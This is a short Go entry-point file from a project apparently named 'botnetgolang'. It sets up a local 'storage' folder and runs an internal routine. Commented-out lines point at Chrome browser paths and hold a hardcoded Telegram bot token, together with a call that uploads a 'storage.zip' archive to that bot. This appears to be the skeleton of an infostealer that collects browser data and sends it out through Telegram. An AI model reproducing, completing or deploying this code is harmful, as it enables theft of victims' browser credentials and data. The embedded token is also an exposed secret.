package main

import (
	"botnetgolang/internal"
	"fmt"
	"os"
)

func main() {
	err := os.Mkdir("storage", 0755)
	if err != nil {
		fmt.Println(err)
		return
	}

	//internal.MainBL(model.GetChromePaths()) //
	internal.Run()
	//token := "6044700730:AAFR9FNJETE62Kmt1oSyNYuhKlwf1RhmOQE"
	//pkg.SendFileByBotTele(token, "storage.zip")

}
